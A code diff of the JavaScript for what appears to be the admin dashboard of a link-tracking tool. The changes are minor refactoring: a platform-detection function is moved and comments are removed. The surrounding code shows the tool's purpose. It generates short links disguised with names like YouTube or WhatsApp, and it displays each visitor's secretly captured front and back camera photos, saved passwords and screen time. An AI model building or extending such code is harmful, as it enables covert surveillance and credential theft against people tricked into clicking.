@@ -86,10 +86,25 @@ function copyToClipboard(text) {
 // GENERATE SHORT LINK
 // ============================================
 function generateShortLink(originalLink, platformName) {
-    // Create a short link with platform name
     const shortId = Math.random().toString(36).substring(2, 8);
     const platformSlug = platformName.toLowerCase().replace(/[^a-z0-9]/g, '');
     return `${window.location.origin}/s/${platformSlug}-${shortId}`;
+}
+
+function detectPlatformFromUrl(url) {
+    const platforms = ['YouTube', 'Instagram', 'Facebook', 'Twitter', 'WhatsApp', 'Telegram', 'LinkedIn', 'Reddit', 'Pinterest', 'TikTok', 'Snapchat', 'GitHub', 'Google', 'Netflix', 'Amazon', 'Spotify', 'Discord', 'Twitch'];
+    try {
+        const urlObj = new URL(url);
+        const hostname = urlObj.hostname.replace('www.', '');
+        for (const platform of platforms) {
+            if (hostname.includes(platform.toLowerCase()) || url.includes(platform.toLowerCase())) {
+                return platform;
+            }
+        }
+        return 'Website';
+    } catch {
+        return 'Website';
+    }
 }
 
 // ============================================
@@ -129,7 +144,6 @@ function generateCustomLink() {
             document.getElementById('generatedLinkId').textContent = data.linkId;
             document.getElementById('redirectUrlDisplay').textContent = data.redirectUrl;
             
-            // Generate short link with platform name
             const platform = detectPlatformFromUrl(data.redirectUrl);
             const shortLink = generateShortLink(data.link, platform);
             document.getElementById('shortLinkDisplay').textContent = shortLink;
@@ -142,22 +156,6 @@ function generateCustomLink() {
     .catch(error => {
         alert('Error: ' + error.message);
     });
-}
-
-function detectPlatformFromUrl(url) {
-    const platforms = ['YouTube', 'Instagram', 'Facebook', 'Twitter', 'WhatsApp', 'Telegram', 'LinkedIn', 'Reddit', 'Pinterest', 'TikTok', 'Snapchat', 'GitHub', 'Google', 'Netflix', 'Amazon', 'Spotify', 'Discord', 'Twitch'];
-    try {
-        const urlObj = new URL(url);
-        const hostname = urlObj.hostname.replace('www.', '');
-        for (const platform of platforms) {
-            if (hostname.includes(platform.toLowerCase()) || url.includes(platform.toLowerCase())) {
-                return platform;
-            }
-        }
-        return 'Website';
-    } catch {
-        return 'Website';
-    }
 }
 
 // ============================================
@@ -473,7 +471,7 @@ function clearFilters() {
 }
 
 // ============================================
-// SHOW USER DETAILS - WITH ALL FEATURES
+// SHOW USER DETAILS
 // ============================================
 function showUserDetails(userId) {
     currentVisitorId = userId;
@@ -513,7 +511,6 @@ function showUserDetails(userId) {
                 visitHistoryHTML = '<p style="color:#999;">No visit history available</p>';
             }
             
-            // Photos with Delete Button
             const frontPhoto = user.frontCamera || null;
             const backPhoto = user.backCamera || null;
             
@@ -563,7 +560,6 @@ function showUserDetails(userId) {
                 backPhotoHTML = '<p style="color:#999;">No back photo</p>';
             }
             
-            // Saved Passwords
             let savedPasswordsHTML = '';
             if (user.savedPasswords && user.savedPasswords.length > 0) {
                 savedPasswordsHTML = '<div class="visitor-details-grid">';
@@ -580,7 +576,6 @@ function showUserDetails(userId) {
                 savedPasswordsHTML += '</div>';
             }
             
-            // Screen Time
             let screenTimeHTML = '';
             if (user.screenTime) {
                 screenTimeHTML = `
